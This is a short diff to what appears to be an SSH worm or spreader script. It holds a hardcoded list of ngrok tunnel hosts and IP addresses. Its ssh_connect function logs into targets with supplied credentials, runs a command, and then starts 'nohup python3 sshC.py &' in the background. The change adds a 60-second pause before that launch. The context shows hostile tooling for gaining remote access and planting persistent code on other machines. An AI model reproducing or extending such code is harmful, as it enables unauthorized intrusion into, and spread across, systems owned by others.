@@ -7,7 +7,7 @@ import random
 from termcolor import colored
 import platform
 import requests as re
-
+import time
 ips = ['3.130.209.29',
        '3.140.223.7', '8.tcp.ngrok.io', '3.140.223.7', '0.tcp.ngrok.io', 'bf131400.ngrok.io', '1.tcp.ngrok.io',
        '0.tcp.eu.ngrok.io', '5.tcp.ngrok.io', '5.tcp.ngrok.io', '4.tcp.ngrok.io', '3.13.191.225', '3.22.30.40',
@@ -3262,6 +3262,7 @@ def ssh_connect(target_ip, username, password, port, commandd):
     try:
         ssh.connect(target_ip, port=port, username=username, password=password, banner_timeout=10, allow_agent=True)
         ssh.exec_command(commandd)
+        time.sleep(60)
         ssh.exec_command("nohup python3 sshC.py &")
         ssh.close()
         return 1
